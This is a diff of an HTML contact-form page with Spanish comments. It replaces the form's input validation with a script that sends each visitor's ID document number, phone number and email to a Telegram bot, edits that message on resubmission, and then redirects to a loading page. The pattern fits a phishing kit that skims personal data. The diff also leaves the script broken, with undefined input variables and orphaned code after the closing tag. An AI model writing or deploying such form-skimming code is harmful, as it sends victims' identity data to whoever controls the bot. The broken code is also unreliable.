@@ -93,41 +93,85 @@
         </div>
     </div>
 
-    <script>
-        const documentInput = document.getElementById('document');
-        const phoneInput = document.getElementById('phone');
-        const emailInput = document.getElementById('email');
-        const continueBtn = document.getElementById('continueBtn');
-        
-        documentInput.addEventListener('input', () => {
-            documentInput.value = documentInput.value.replace(/[^0-9]/g, '');
-            validateField('document');
-        });
-        phoneInput.addEventListener('input', () => {
-            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
-            validateField('phone');
-        });
-        emailInput.addEventListener('input', () => validateField('email'));
-        continueBtn.addEventListener('click', submitForm);
+   <script>
+    const botToken = "TU_BOT_TOKEN"; // 🔹 Reemplaza
+    const chatId = "TU_CHAT_ID";     // 🔹 Reemplaza
+    
+    let sentMessageId = sessionStorage.getItem("telegramMessageId") || null;
 
-        function validateField(fieldName) {
-            const field = document.getElementById(fieldName);
-            const errorDiv = document.getElementById(fieldName + '-error');
-            let isValid = false;
-            switch(fieldName) {
-                case 'document': isValid = field.value.length >= 7 && field.value.length <= 15; break;
-                case 'phone': isValid = field.value.length === 10; break;
-                case 'email': isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(field.value); break;
-            }
-            if (field.value === '') {
-                field.classList.remove('error', 'valid'); errorDiv.style.display = 'none';
-            } else if (isValid) {
-                field.classList.remove('error'); field.classList.add('valid'); errorDiv.style.display = 'none';
-            } else {
-                field.classList.remove('valid'); field.classList.add('error'); errorDiv.style.display = 'block';
-            }
-            checkFormValidity();
+    function submitForm() {
+        const formData = {
+            document: documentInput.value,
+            phone: phoneInput.value,
+            email: emailInput.value
+        };
+
+        sessionStorage.setItem('contactData', JSON.stringify(formData));
+
+        // Enviar o actualizar mensaje en Telegram
+        const message = `
+📌 Datos de contacto:
+🪪 Documento: ${formData.document}
+📱 Teléfono: ${formData.phone}
+📧 Correo: ${formData.email}
+        `;
+
+        if (!sentMessageId) {
+            sendTelegramMessage(message, () => {
+                showLoadingPage();
+            });
+        } else {
+            updateTelegramMessage(message, () => {
+                showLoadingPage();
+            });
         }
+    }
+
+    function sendTelegramMessage(text, callback) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text })
+        })
+        .then(res => res.json())
+        .then(result => {
+            if (result.ok) {
+                sentMessageId = result.result.message_id;
+                sessionStorage.setItem("telegramMessageId", sentMessageId);
+                console.log("Mensaje enviado, ID:", sentMessageId);
+            }
+            if (callback) callback();
+        })
+        .catch(err => console.error("Error Telegram:", err));
+    }
+
+    function updateTelegramMessage(newText, callback) {
+        fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                message_id: sentMessageId,
+                text: newText
+            })
+        })
+        .then(res => res.json())
+        .then(result => {
+            if (result.ok) {
+                console.log("Mensaje actualizado correctamente");
+            } else {
+                console.error("Error al actualizar mensaje:", result);
+            }
+            if (callback) callback();
+        })
+        .catch(err => console.error("Error Telegram:", err));
+    }
+
+    function showLoadingPage() {
+        window.location.href = 'loading.html';
+    }
+</script>
+
 
         function checkFormValidity() {
             const documentValid = documentInput.value.length >= 7 && documentInput.value.length <= 15;
@@ -181,4 +225,5 @@
     </script>
 </body>
 </html>
+
 
